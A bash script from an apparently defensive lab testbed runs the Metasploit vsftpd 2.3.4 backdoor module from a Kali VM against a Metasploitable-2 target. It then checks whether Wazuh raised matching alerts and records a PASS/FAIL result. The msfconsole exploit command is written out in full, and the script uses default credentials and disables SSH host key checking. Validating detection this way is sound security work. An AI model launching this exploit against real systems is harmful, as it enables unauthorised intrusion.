#!/usr/bin/env bash
# Scenario 03: vsftpd 2.3.4 Backdoor Exploit (MITRE T1190) — focused standalone script.
# Fires exploit/unix/ftp/vsftpd_234_backdoor from Kali Attack (.11) against MS-2 (.13),
# then waits for a matching rule to appear in Wazuh alerts.json.
#
# Pre-condition: MS-2 syslog must be forwarding to Wazuh UDP 514.
#   On MS-2 console (sysklogd, Ubuntu 8.04):
#     echo "*.* @192.168.10.14" | sudo tee -a /etc/syslog.conf
#     sudo kill -HUP $(pidof syslogd)
#   Verify: bash scripts/06-verify-telemetry-sources.sh
#
# If this run FAILs, check for decoder gap:
#   SSH to Wazuh and run:
#     sudo grep -a 'vsftpd\|ftp' /var/ossec/logs/archives/archives.log | tail -5
#   If raw events appear → decoder gap → deploy vsftpd-stripped decoder + rule 100020,
#   restart wazuh-manager, then re-run this script.
#
# Usage:
#   source testbed/credentials.env
#   bash scripts/10-run-scenario-03.sh

set -euo pipefail

CSCY_ROOT="${CSCY_ROOT:-$(cd "$(dirname "$0")/.." && pwd)}"
CREDS="$CSCY_ROOT/testbed/credentials.env"
[[ -f "$CREDS" ]] && source "$CREDS"

WAZUH_HOST="${WAZUH_HOST:-192.168.10.14}"
WAZUH_SSH_USER="${WAZUH_SSH_USER:-analyst}"
WAZUH_SSH_PASS="${WAZUH_SSH_PASS:-}"
KALI_ATTACK_VM="${KALI_ATTACK_VM:-Kali Attack VM}"
KALI_ATTACK_HOST="${KALI_ATTACK_HOST:-192.168.10.11}"
MS2_HOST="${MS2_HOST:-192.168.10.13}"
KALI_USER="${KALI_USER:-kali}"
KALI_PASS="${KALI_PASS:-kali}"
WAIT_SECS="${WAIT_SECS:-70}"
EVIDENCE_DIR="$CSCY_ROOT/evidence/scenario-03-vsftpd"

mkdir -p "$EVIDENCE_DIR"

echo "=== Scenario 03: vsftpd 2.3.4 Backdoor Exploit ==="

# ── Step 0: Verify MS-2 is running ───────────────────────────────────────────
echo "[0/6] Checking MS-2 Target VM is running..."
if ! VBoxManage list runningvms | grep -q 'MS-2'; then
  echo "ERROR: MS-2 Target VM is not running. Start it first." >&2
  exit 1
fi
echo "  MS-2 is running."

# ── Step 1: Start Kali Attack VM ─────────────────────────────────────────────
echo "[1/6] Starting Kali Attack VM (headless)..."
VBoxManage startvm "$KALI_ATTACK_VM" --type headless 2>/dev/null || true
echo "  Waiting 30s for VM to boot..."
sleep 30

# ── Step 2: Bootstrap SSH on Kali Attack ─────────────────────────────────────
echo "[2/6] Bootstrapping SSH on Kali Attack VM..."
VBoxManage guestcontrol "$KALI_ATTACK_VM" run \
  --exe /bin/bash \
  --username "$KALI_USER" \
  --password "$KALI_PASS" \
  -- -lc "echo 'kali' | sudo -S systemctl start ssh" 2>/dev/null || true
sleep 5

# ── Step 3: Run vsftpd backdoor exploit from Kali Attack against MS-2 ────────
# exploit/unix/ftp/vsftpd_234_backdoor triggers a backdoor listener on port 6200
# that vsftpd 2.3.4 opens when the username contains ":)". The exploit connects
# to port 21, sends the trigger, then connects to port 6200. The FTP session and
# any resulting vsftpd log lines are what Wazuh should ingest from MS-2 syslog.
echo "[3/6] Running vsftpd backdoor exploit from Kali Attack (${KALI_ATTACK_HOST}) against MS-2 (${MS2_HOST})..."
start_ts=$(date +%s)
export SSHPASS="$KALI_PASS"
sshpass -e ssh -F /dev/null \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=30 \
  "${KALI_USER}@${KALI_ATTACK_HOST}" \
  "timeout 120 msfconsole -q -x \
    'use exploit/unix/ftp/vsftpd_234_backdoor; \
     set RHOSTS ${MS2_HOST}; set RPORT 21; run; exit' \
   2>/dev/null || true"
echo "  Exploit run complete at $(date -Iseconds)"

# ── Step 4: Wait for alert propagation ───────────────────────────────────────
echo "[4/6] Waiting ${WAIT_SECS}s for alert pipeline latency..."
sleep "$WAIT_SECS"

# ── Step 5: Check Wazuh alerts.json for matching rules ───────────────────────
# vsftpd exploit may trigger FTP-related rules (31xxx series) or generic syslog
# rules if a custom vsftpd-stripped decoder is deployed. Rule 100020 is reserved
# for a future custom composite rule for this scenario.
# Priority order: FTP-specific rules first, then generic catch-alls, then custom.
echo "[5/6] Querying Wazuh (${WAZUH_HOST}) for FTP/vsftpd rules from MS-2 (${MS2_HOST})..."
alert_snippet=""
rule_fired=""
found=0

if [[ -n "$WAZUH_SSH_PASS" ]] && command -v sshpass &>/dev/null; then
  export SSHPASS="$WAZUH_SSH_PASS"
  for rule_id in 31108 31107 31101 5501 5402 5303 2501 1002 100001 100020; do
    raw=$(sshpass -e ssh -F /dev/null \
      -o StrictHostKeyChecking=accept-new \
      -o ConnectTimeout=10 \
      "${WAZUH_SSH_USER}@${WAZUH_HOST}" \
      "echo '${WAZUH_SSH_PASS}' | sudo -S grep -E '\"id\":\"${rule_id}\"' \
       /var/ossec/logs/alerts/alerts.json 2>/dev/null | \
       grep '\"location\":\"${MS2_HOST}\"' | tail -3" 2>/dev/null) || true
    if [[ -n "$raw" ]]; then
      found=1
      rule_fired="$rule_id"
      alert_snippet="$raw"
      echo "  Found rule ${rule_id} alert referencing MS-2 (${MS2_HOST})."
      break
    fi
  done
else
  echo "  WARN: WAZUH_SSH_PASS not set or sshpass not available; skipping SSH check."
fi

latency=$(( $(date +%s) - start_ts ))

# ── Step 6: Write evidence JSON ───────────────────────────────────────────────
outcome="FAIL"
[[ $found -eq 1 ]] && outcome="PASS"

# Escape double-quotes in snippet for JSON embedding
safe_snippet=$(echo "$alert_snippet" | head -1 | sed 's/"/\\"/g')

echo "[6/6] Writing evidence to $EVIDENCE_DIR/result.json..."
cat > "$EVIDENCE_DIR/result.json" << EOF
{
  "scenario": "03-vsftpd-exploit",
  "outcome": "${outcome}",
  "rule_fired": "${rule_fired}",
  "latency_seconds": ${latency},
  "expected_rule_ids": "31108|31107|31101|5501|5402|5303|2501|1002|100001|100020",
  "alert_snippet": "${safe_snippet}",
  "timestamp": "$(date -Iseconds)"
}
EOF

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo "=== Scenario 03 Result: ${outcome} (latency ${latency}s) ==="
echo "    Rule fired: ${rule_fired:-none}"
echo "    Evidence:   $EVIDENCE_DIR/result.json"
if [[ "$outcome" == "FAIL" ]]; then
  echo ""
  echo "  FAIL diagnostic: check for decoder gap on Wazuh:"
  echo "    sudo grep -a 'vsftpd\\|ftp' /var/ossec/logs/archives/archives.log | tail -5"
  echo "  If raw events appear, deploy vsftpd-stripped decoder + rule 100020,"
  echo "  restart wazuh-manager, then re-run this script."
fi
[[ "$outcome" == "PASS" ]] && exit 0 || exit 1
